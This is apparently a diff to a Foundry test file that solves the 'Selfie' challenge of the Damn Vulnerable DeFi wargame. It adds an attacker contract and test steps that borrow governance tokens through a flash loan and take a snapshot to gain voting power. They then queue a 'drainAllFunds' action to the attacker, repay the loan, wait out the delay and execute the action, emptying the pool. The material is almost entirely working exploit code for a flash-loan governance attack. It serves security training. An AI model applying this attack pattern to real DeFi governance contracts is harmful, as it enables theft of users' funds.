@@ -47,6 +47,16 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        AttackContract attackContract = new AttackContract(address(selfiePool), address(simpleGovernance), address(dvtSnapshot), attacker);
+        attackContract.attack();
+        vm.stopPrank();
+        vm.warp(block.timestamp + 2 days);
+        vm.roll(1);
+
+        vm.startPrank(attacker);
+        simpleGovernance.executeAction(1);
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -59,5 +69,28 @@ contract Selfie is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
+    }
+}
+
+contract AttackContract {
+    SelfiePool internal selfiePool;
+    SimpleGovernance internal simpleGovernance;
+    DamnValuableTokenSnapshot internal dvtSnapshot;
+    address owner;
+    constructor (address _selfiePool, address _simpleGovernance, address _dvtSnapshot, address _owner) {
+        selfiePool = SelfiePool(_selfiePool);
+        simpleGovernance = SimpleGovernance(_simpleGovernance);
+        dvtSnapshot = DamnValuableTokenSnapshot(_dvtSnapshot);
+        owner = _owner;
+    }
+    function attack() external {
+        selfiePool.flashLoan(1_500_000e18);
+    }
+
+    function receiveTokens(address token,uint256 borrowAmount) external {
+        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);
+        dvtSnapshot.snapshot();
+        simpleGovernance.queueAction(address(selfiePool), data, 0);
+        dvtSnapshot.transfer(address(selfiePool), borrowAmount);
     }
 }
